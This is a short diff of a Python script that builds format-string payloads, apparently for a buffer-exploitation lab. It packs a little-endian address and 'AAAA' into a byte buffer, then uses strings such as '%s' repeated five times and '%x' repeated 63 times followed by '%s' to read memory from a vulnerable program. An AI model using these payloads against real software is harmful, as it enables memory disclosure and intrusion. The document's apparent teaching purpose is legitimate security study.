@@ -98,9 +98,7 @@ content[4:8]  =  ("AAAA").encode('latin-1')
 
 
 
-# This line shows how to construct a string s with
-
-#   12 of "%.8x", concatenated with a "%n"
+# This line shows how to construct a string s with 5 of "%s"
 
 s = "%s" * 5
 
@@ -198,10 +196,6 @@ content[0:4]  =  (number).to_bytes(4,byteorder='little')
 content[4:8]  =  ("AAAA").encode('latin-1')
 
 
-
-# This line shows how to construct a string s with
-
-#   12 of "%.8x", concatenated with a "%n"
 
 s = "%x"*63 + "%s"
 
